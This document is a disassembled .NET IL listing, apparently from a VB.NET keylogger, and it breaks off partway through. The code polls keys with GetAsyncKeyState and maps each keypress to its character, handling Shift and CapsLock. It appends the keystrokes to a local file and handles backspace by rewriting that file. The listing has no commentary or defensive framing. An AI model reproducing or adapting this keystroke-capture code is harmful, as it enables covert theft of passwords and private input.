    IL_0000:  ldc.i4.s   10
    IL_0002:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0007:  ldc.i4.8
    IL_0008:  stloc.0
    IL_0009:  ldloc.0
    IL_000a:  stloc.1
    IL_000b:  ldloc.1
    IL_000c:  ldc.i4.8
    IL_000d:  beq.s      IL_0053

    IL_000f:  ldloc.1
    IL_0010:  ldc.i4.s   13
    IL_0012:  beq.s      IL_0053

    IL_0014:  ldloc.1
    IL_0015:  ldc.i4.s   32
    IL_0017:  beq.s      IL_0053

    IL_0019:  ldloc.1
    IL_001a:  ldc.i4.s   48
    IL_001c:  blt.s      IL_0023

    IL_001e:  ldloc.1
    IL_001f:  ldc.i4.s   57
    IL_0021:  ble.s      IL_0053

    IL_0023:  ldloc.1
    IL_0024:  ldc.i4.s   65
    IL_0026:  blt.s      IL_002d

    IL_0028:  ldloc.1
    IL_0029:  ldc.i4.s   90
    IL_002b:  ble.s      IL_0053

    IL_002d:  ldloc.1
    IL_002e:  ldc.i4     0xba
    IL_0033:  blt.s      IL_003d

    IL_0035:  ldloc.1
    IL_0036:  ldc.i4     0xc0
    IL_003b:  ble.s      IL_0053

    IL_003d:  ldloc.1
    IL_003e:  ldc.i4     0xdb
    IL_0043:  blt        IL_0bd0

    IL_0048:  ldloc.1
    IL_0049:  ldc.i4     0xde
    IL_004e:  bgt        IL_0bd0

    IL_0053:  ldloc.0
    IL_0054:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0059:  ldc.i4     0xffff8001
    IL_005e:  bne.un     IL_0bd0

    IL_0063:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_0068:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_006d:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
    IL_0072:  brtrue     IL_0bd0

    IL_0077:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_007c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_0081:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0086:  ldc.i4.0
    IL_0087:  ceq
    IL_0089:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_008e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_0093:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0098:  ldc.i4.0
    IL_0099:  ceq
    IL_009b:  and
    IL_009c:  box        [mscorlib]System.Boolean
    IL_00a1:  stloc.2
    IL_00a2:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_00a7:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_00ac:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_00b1:  box        [mscorlib]System.Boolean
    IL_00b6:  stloc.3
    IL_00b7:  ldc.i4.8
    IL_00b8:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_00bd:  ldc.i4.0
    IL_00be:  cgt.un
    IL_00c0:  brfalse    IL_018f

    IL_00c5:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_00ca:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_00cf:  ldsfld     object Library.Module1::p
    IL_00d4:  ldsfld     object Library.Module1::q
    IL_00d9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_00de:  ldsfld     object Library.Module1::t
    IL_00e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_00e8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_00ed:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_00f2:  brfalse    IL_098e

    IL_00f7:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_00fc:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0101:  ldsfld     object Library.Module1::p
    IL_0106:  ldsfld     object Library.Module1::q
    IL_010b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0110:  ldsfld     object Library.Module1::t
    IL_0115:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_011a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_011f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0124:  stloc.s    V_4
    IL_0126:  ldloc.s    V_4
    IL_0128:  ldstr      ""
    IL_012d:  ldc.i4.0
    IL_012e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                            object,
                                                                                                                            bool)
    IL_0133:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::NotObject(object)
    IL_0138:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_013d:  brfalse    IL_098e

    IL_0142:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_0147:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_014c:  ldsfld     object Library.Module1::p
    IL_0151:  ldsfld     object Library.Module1::q
    IL_0156:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_015b:  ldsfld     object Library.Module1::t
    IL_0160:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0165:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_016a:  ldloc.s    V_4
    IL_016c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0171:  ldloc.s    V_4
    IL_0173:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0178:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Len(object)
    IL_017d:  ldc.i4.1
    IL_017e:  sub
    IL_017f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Left(string,
                                                                                           int32)
    IL_0184:  ldc.i4.0
    IL_0185:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_018a:  br         IL_098e

    IL_018f:  ldc.i4.s   13
    IL_0191:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0196:  ldc.i4.0
    IL_0197:  cgt.un
    IL_0199:  brfalse.s  IL_01aa

    IL_019b:  ldstr      "\r\n"
    IL_01a0:  stsfld     object Library.Module1::l
    IL_01a5:  br         IL_098e

    IL_01aa:  ldc.i4.s   32
    IL_01ac:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_01b1:  ldc.i4.0
    IL_01b2:  cgt.un
    IL_01b4:  brfalse.s  IL_01c5

    IL_01b6:  ldstr      " "
    IL_01bb:  stsfld     object Library.Module1::l
    IL_01c0:  br         IL_098e

    IL_01c5:  ldc.i4.s   48
    IL_01c7:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_01cc:  ldc.i4.0
    IL_01cd:  cgt.un
    IL_01cf:  brfalse.s  IL_01ef

    IL_01d1:  ldloc.3
    IL_01d2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_01d7:  brtrue.s   IL_01e0

    IL_01d9:  ldstr      "0"
    IL_01de:  br.s       IL_01e5

    IL_01e0:  ldstr      ")"
    IL_01e5:  stsfld     object Library.Module1::l
    IL_01ea:  br         IL_098e

    IL_01ef:  ldc.i4.s   49
    IL_01f1:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_01f6:  ldc.i4.0
    IL_01f7:  cgt.un
    IL_01f9:  brfalse.s  IL_0219

    IL_01fb:  ldloc.3
    IL_01fc:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0201:  brtrue.s   IL_020a

    IL_0203:  ldstr      "1"
    IL_0208:  br.s       IL_020f

    IL_020a:  ldstr      "!"
    IL_020f:  stsfld     object Library.Module1::l
    IL_0214:  br         IL_098e

    IL_0219:  ldc.i4.s   50
    IL_021b:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0220:  ldc.i4.0
    IL_0221:  cgt.un
    IL_0223:  brfalse.s  IL_0243

    IL_0225:  ldloc.3
    IL_0226:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_022b:  brtrue.s   IL_0234

    IL_022d:  ldstr      "2"
    IL_0232:  br.s       IL_0239

    IL_0234:  ldstr      "@"
    IL_0239:  stsfld     object Library.Module1::l
    IL_023e:  br         IL_098e

    IL_0243:  ldc.i4.s   51
    IL_0245:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_024a:  ldc.i4.0
    IL_024b:  cgt.un
    IL_024d:  brfalse.s  IL_026d

    IL_024f:  ldloc.3
    IL_0250:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0255:  brtrue.s   IL_025e

    IL_0257:  ldstr      "3"
    IL_025c:  br.s       IL_0263

    IL_025e:  ldstr      "#"
    IL_0263:  stsfld     object Library.Module1::l
    IL_0268:  br         IL_098e

    IL_026d:  ldc.i4.s   52
    IL_026f:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0274:  ldc.i4.0
    IL_0275:  cgt.un
    IL_0277:  brfalse.s  IL_0297

    IL_0279:  ldloc.3
    IL_027a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_027f:  brtrue.s   IL_0288

    IL_0281:  ldstr      "4"
    IL_0286:  br.s       IL_028d

    IL_0288:  ldstr      "$"
    IL_028d:  stsfld     object Library.Module1::l
    IL_0292:  br         IL_098e

    IL_0297:  ldc.i4.s   53
    IL_0299:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_029e:  ldc.i4.0
    IL_029f:  cgt.un
    IL_02a1:  brfalse.s  IL_02c1

    IL_02a3:  ldloc.3
    IL_02a4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_02a9:  brtrue.s   IL_02b2

    IL_02ab:  ldstr      "5"
    IL_02b0:  br.s       IL_02b7

    IL_02b2:  ldstr      "%"
    IL_02b7:  stsfld     object Library.Module1::l
    IL_02bc:  br         IL_098e

    IL_02c1:  ldc.i4.s   54
    IL_02c3:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_02c8:  ldc.i4.0
    IL_02c9:  cgt.un
    IL_02cb:  brfalse.s  IL_02eb

    IL_02cd:  ldloc.3
    IL_02ce:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_02d3:  brtrue.s   IL_02dc

    IL_02d5:  ldstr      "6"
    IL_02da:  br.s       IL_02e1

    IL_02dc:  ldstr      "^"
    IL_02e1:  stsfld     object Library.Module1::l
    IL_02e6:  br         IL_098e

    IL_02eb:  ldc.i4.s   55
    IL_02ed:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_02f2:  ldc.i4.0
    IL_02f3:  cgt.un
    IL_02f5:  brfalse.s  IL_0315

    IL_02f7:  ldloc.3
    IL_02f8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_02fd:  brtrue.s   IL_0306

    IL_02ff:  ldstr      "7"
    IL_0304:  br.s       IL_030b

    IL_0306:  ldstr      "&"
    IL_030b:  stsfld     object Library.Module1::l
    IL_0310:  br         IL_098e

    IL_0315:  ldc.i4.s   56
    IL_0317:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_031c:  ldc.i4.0
    IL_031d:  cgt.un
    IL_031f:  brfalse.s  IL_033f

    IL_0321:  ldloc.3
    IL_0322:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0327:  brtrue.s   IL_0330

    IL_0329:  ldstr      "8"
    IL_032e:  br.s       IL_0335

    IL_0330:  ldstr      "*"
    IL_0335:  stsfld     object Library.Module1::l
    IL_033a:  br         IL_098e

    IL_033f:  ldc.i4.s   57
    IL_0341:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0346:  ldc.i4.0
    IL_0347:  cgt.un
    IL_0349:  brfalse.s  IL_0369

    IL_034b:  ldloc.3
    IL_034c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0351:  brtrue.s   IL_035a

    IL_0353:  ldstr      "9"
    IL_0358:  br.s       IL_035f

    IL_035a:  ldstr      "("
    IL_035f:  stsfld     object Library.Module1::l
    IL_0364:  br         IL_098e

    IL_0369:  ldc.i4.s   65
    IL_036b:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0370:  ldc.i4.0
    IL_0371:  cgt.un
    IL_0373:  brfalse.s  IL_0393

    IL_0375:  ldloc.2
    IL_0376:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_037b:  brtrue.s   IL_0384

    IL_037d:  ldstr      "A"
    IL_0382:  br.s       IL_0389

    IL_0384:  ldstr      "a"
    IL_0389:  stsfld     object Library.Module1::l
    IL_038e:  br         IL_098e

    IL_0393:  ldc.i4.s   66
    IL_0395:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_039a:  ldc.i4.0
    IL_039b:  cgt.un
    IL_039d:  brfalse.s  IL_03bd

    IL_039f:  ldloc.2
    IL_03a0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03a5:  brtrue.s   IL_03ae

    IL_03a7:  ldstr      "B"
    IL_03ac:  br.s       IL_03b3

    IL_03ae:  ldstr      "b"
    IL_03b3:  stsfld     object Library.Module1::l
    IL_03b8:  br         IL_098e

    IL_03bd:  ldc.i4.s   67
    IL_03bf:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_03c4:  ldc.i4.0
    IL_03c5:  cgt.un
    IL_03c7:  brfalse.s  IL_03e7

    IL_03c9:  ldloc.2
    IL_03ca:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03cf:  brtrue.s   IL_03d8

    IL_03d1:  ldstr      "C"
    IL_03d6:  br.s       IL_03dd

    IL_03d8:  ldstr      "c"
    IL_03dd:  stsfld     object Library.Module1::l
    IL_03e2:  br         IL_098e

    IL_03e7:  ldc.i4.s   68
    IL_03e9:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_03ee:  ldc.i4.0
    IL_03ef:  cgt.un
    IL_03f1:  brfalse.s  IL_0411

    IL_03f3:  ldloc.2
    IL_03f4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03f9:  brtrue.s   IL_0402

    IL_03fb:  ldstr      "D"
    IL_0400:  br.s       IL_0407

    IL_0402:  ldstr      "d"
    IL_0407:  stsfld     object Library.Module1::l
    IL_040c:  br         IL_098e

    IL_0411:  ldc.i4.s   69
    IL_0413:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0418:  ldc.i4.0
    IL_0419:  cgt.un
    IL_041b:  brfalse.s  IL_043b

    IL_041d:  ldloc.2
    IL_041e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0423:  brtrue.s   IL_042c

    IL_0425:  ldstr      "E"
    IL_042a:  br.s       IL_0431

    IL_042c:  ldstr      "e"
    IL_0431:  stsfld     object Library.Module1::l
    IL_0436:  br         IL_098e

    IL_043b:  ldc.i4.s   70
    IL_043d:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0442:  ldc.i4.0
    IL_0443:  cgt.un
    IL_0445:  brfalse.s  IL_0465

    IL_0447:  ldloc.2
    IL_0448:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_044d:  brtrue.s   IL_0456

    IL_044f:  ldstr      "F"
    IL_0454:  br.s       IL_045b

    IL_0456:  ldstr      "f"
    IL_045b:  stsfld     object Library.Module1::l
    IL_0460:  br         IL_098e

    IL_0465:  ldc.i4.s   71
    IL_0467:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_046c:  ldc.i4.0
    IL_046d:  cgt.un
    IL_046f:  brfalse.s  IL_048f

    IL_0471:  ldloc.2
    IL_0472:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0477:  brtrue.s   IL_0480

    IL_0479:  ldstr      "G"
    IL_047e:  br.s       IL_0485

    IL_0480:  ldstr      "g"
    IL_0485:  stsfld     object Library.Module1::l
    IL_048a:  br         IL_098e

    IL_048f:  ldc.i4.s   72
    IL_0491:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0496:  ldc.i4.0
    IL_0497:  cgt.un
    IL_0499:  brfalse.s  IL_04b9

    IL_049b:  ldloc.2
    IL_049c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04a1:  brtrue.s   IL_04aa

    IL_04a3:  ldstr      "H"
    IL_04a8:  br.s       IL_04af

    IL_04aa:  ldstr      "h"
    IL_04af:  stsfld     object Library.Module1::l
    IL_04b4:  br         IL_098e

    IL_04b9:  ldc.i4.s   73
    IL_04bb:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_04c0:  ldc.i4.0
    IL_04c1:  cgt.un
    IL_04c3:  brfalse.s  IL_04e3

    IL_04c5:  ldloc.2
    IL_04c6:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04cb:  brtrue.s   IL_04d4

    IL_04cd:  ldstr      "I"
    IL_04d2:  br.s       IL_04d9

    IL_04d4:  ldstr      "i"
    IL_04d9:  stsfld     object Library.Module1::l
    IL_04de:  br         IL_098e

    IL_04e3:  ldc.i4.s   74
    IL_04e5:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_04ea:  ldc.i4.0
    IL_04eb:  cgt.un
    IL_04ed:  brfalse.s  IL_050d

    IL_04ef:  ldloc.2
    IL_04f0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04f5:  brtrue.s   IL_04fe

    IL_04f7:  ldstr      "J"
    IL_04fc:  br.s       IL_0503

    IL_04fe:  ldstr      "j"
    IL_0503:  stsfld     object Library.Module1::l
    IL_0508:  br         IL_098e

    IL_050d:  ldc.i4.s   75
    IL_050f:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0514:  ldc.i4.0
    IL_0515:  cgt.un
    IL_0517:  brfalse.s  IL_0537

    IL_0519:  ldloc.2
    IL_051a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_051f:  brtrue.s   IL_0528

    IL_0521:  ldstr      "K"
    IL_0526:  br.s       IL_052d

    IL_0528:  ldstr      "k"
    IL_052d:  stsfld     object Library.Module1::l
    IL_0532:  br         IL_098e

    IL_0537:  ldc.i4.s   76
    IL_0539:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_053e:  ldc.i4.0
    IL_053f:  cgt.un
    IL_0541:  brfalse.s  IL_0561

    IL_0543:  ldloc.2
    IL_0544:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0549:  brtrue.s   IL_0552

    IL_054b:  ldstr      "L"
    IL_0550:  br.s       IL_0557

    IL_0552:  ldstr      "l"
    IL_0557:  stsfld     object Library.Module1::l
    IL_055c:  br         IL_098e

    IL_0561:  ldc.i4.s   77
    IL_0563:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0568:  ldc.i4.0
    IL_0569:  cgt.un
    IL_056b:  brfalse.s  IL_058b

    IL_056d:  ldloc.2
    IL_056e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0573:  brtrue.s   IL_057c

    IL_0575:  ldstr      "M"
    IL_057a:  br.s       IL_0581

    IL_057c:  ldstr      "m"
    IL_0581:  stsfld     object Library.Module1::l
    IL_0586:  br         IL_098e

    IL_058b:  ldc.i4.s   78
    IL_058d:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0592:  ldc.i4.0
    IL_0593:  cgt.un
    IL_0595:  brfalse.s  IL_05b5

    IL_0597:  ldloc.2
    IL_0598:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_059d:  brtrue.s   IL_05a6

    IL_059f:  ldstr      "N"
    IL_05a4:  br.s       IL_05ab

    IL_05a6:  ldstr      "n"
    IL_05ab:  stsfld     object Library.Module1::l
    IL_05b0:  br         IL_098e

    IL_05b5:  ldc.i4.s   79
    IL_05b7:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_05bc:  ldc.i4.0
    IL_05bd:  cgt.un
    IL_05bf:  brfalse.s  IL_05df

    IL_05c1:  ldloc.2
    IL_05c2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_05c7:  brtrue.s   IL_05d0

    IL_05c9:  ldstr      "O"
    IL_05ce:  br.s       IL_05d5

    IL_05d0:  ldstr      "o"
    IL_05d5:  stsfld     object Library.Module1::l
    IL_05da:  br         IL_098e

    IL_05df:  ldc.i4.s   80
    IL_05e1:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_05e6:  ldc.i4.0
    IL_05e7:  cgt.un
    IL_05e9:  brfalse.s  IL_0609

    IL_05eb:  ldloc.2
    IL_05ec:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_05f1:  brtrue.s   IL_05fa

    IL_05f3:  ldstr      "P"
    IL_05f8:  br.s       IL_05ff

    IL_05fa:  ldstr      "p"
    IL_05ff:  stsfld     object Library.Module1::l
    IL_0604:  br         IL_098e

    IL_0609:  ldc.i4.s   81
    IL_060b:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0610:  ldc.i4.0
    IL_0611:  cgt.un
    IL_0613:  brfalse.s  IL_0633

    IL_0615:  ldloc.2
    IL_0616:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_061b:  brtrue.s   IL_0624

    IL_061d:  ldstr      "Q"
    IL_0622:  br.s       IL_0629

    IL_0624:  ldstr      "q"
    IL_0629:  stsfld     object Library.Module1::l
    IL_062e:  br         IL_098e

    IL_0633:  ldc.i4.s   82
    IL_0635:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_063a:  ldc.i4.0
    IL_063b:  cgt.un
    IL_063d:  brfalse.s  IL_065d

    IL_063f:  ldloc.2
    IL_0640:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0645:  brtrue.s   IL_064e

    IL_0647:  ldstr      "R"
    IL_064c:  br.s       IL_0653

    IL_064e:  ldstr      "r"
    IL_0653:  stsfld     object Library.Module1::l
    IL_0658:  br         IL_098e

    IL_065d:  ldc.i4.s   83
    IL_065f:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0664:  ldc.i4.0
    IL_0665:  cgt.un
    IL_0667:  brfalse.s  IL_0687

    IL_0669:  ldloc.2
    IL_066a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_066f:  brtrue.s   IL_0678

    IL_0671:  ldstr      "S"
    IL_0676:  br.s       IL_067d

    IL_0678:  ldstr      "s"
    IL_067d:  stsfld     object Library.Module1::l
    IL_0682:  br         IL_098e

    IL_0687:  ldc.i4.s   84
    IL_0689:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_068e:  ldc.i4.0
    IL_068f:  cgt.un
    IL_0691:  brfalse.s  IL_06b1

    IL_0693:  ldloc.2
    IL_0694:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0699:  brtrue.s   IL_06a2

    IL_069b:  ldstr      "T"
    IL_06a0:  br.s       IL_06a7

    IL_06a2:  ldstr      "t"
    IL_06a7:  stsfld     object Library.Module1::l
    IL_06ac:  br         IL_098e

    IL_06b1:  ldc.i4.s   85
    IL_06b3:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_06b8:  ldc.i4.0
    IL_06b9:  cgt.un
    IL_06bb:  brfalse.s  IL_06db

    IL_06bd:  ldloc.2
    IL_06be:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_06c3:  brtrue.s   IL_06cc

    IL_06c5:  ldstr      "U"
    IL_06ca:  br.s       IL_06d1

    IL_06cc:  ldstr      "u"
    IL_06d1:  stsfld     object Library.Module1::l
    IL_06d6:  br         IL_098e

    IL_06db:  ldc.i4.s   86
    IL_06dd:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_06e2:  ldc.i4.0
    IL_06e3:  cgt.un
    IL_06e5:  brfalse.s  IL_0705

    IL_06e7:  ldloc.2
    IL_06e8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_06ed:  brtrue.s   IL_06f6

    IL_06ef:  ldstr      "V"
    IL_06f4:  br.s       IL_06fb

    IL_06f6:  ldstr      "v"
    IL_06fb:  stsfld     object Library.Module1::l
    IL_0700:  br         IL_098e

    IL_0705:  ldc.i4.s   87
    IL_0707:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_070c:  ldc.i4.0
    IL_070d:  cgt.un
    IL_070f:  brfalse.s  IL_072f

    IL_0711:  ldloc.2
    IL_0712:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0717:  brtrue.s   IL_0720

    IL_0719:  ldstr      "W"
    IL_071e:  br.s       IL_0725

    IL_0720:  ldstr      "w"
    IL_0725:  stsfld     object Library.Module1::l
    IL_072a:  br         IL_098e

    IL_072f:  ldc.i4.s   88
    IL_0731:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0736:  ldc.i4.0
    IL_0737:  cgt.un
    IL_0739:  brfalse.s  IL_0759

    IL_073b:  ldloc.2
    IL_073c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0741:  brtrue.s   IL_074a

    IL_0743:  ldstr      "X"
    IL_0748:  br.s       IL_074f

    IL_074a:  ldstr      "x"
    IL_074f:  stsfld     object Library.Module1::l
    IL_0754:  br         IL_098e

    IL_0759:  ldc.i4.s   89
    IL_075b:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0760:  ldc.i4.0
    IL_0761:  cgt.un
    IL_0763:  brfalse.s  IL_0783

    IL_0765:  ldloc.2
    IL_0766:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_076b:  brtrue.s   IL_0774

    IL_076d:  ldstr      "Y"
    IL_0772:  br.s       IL_0779

    IL_0774:  ldstr      "y"
    IL_0779:  stsfld     object Library.Module1::l
    IL_077e:  br         IL_098e

    IL_0783:  ldc.i4.s   90
    IL_0785:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_078a:  ldc.i4.0
    IL_078b:  cgt.un
    IL_078d:  brfalse.s  IL_07ad

    IL_078f:  ldloc.2
    IL_0790:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
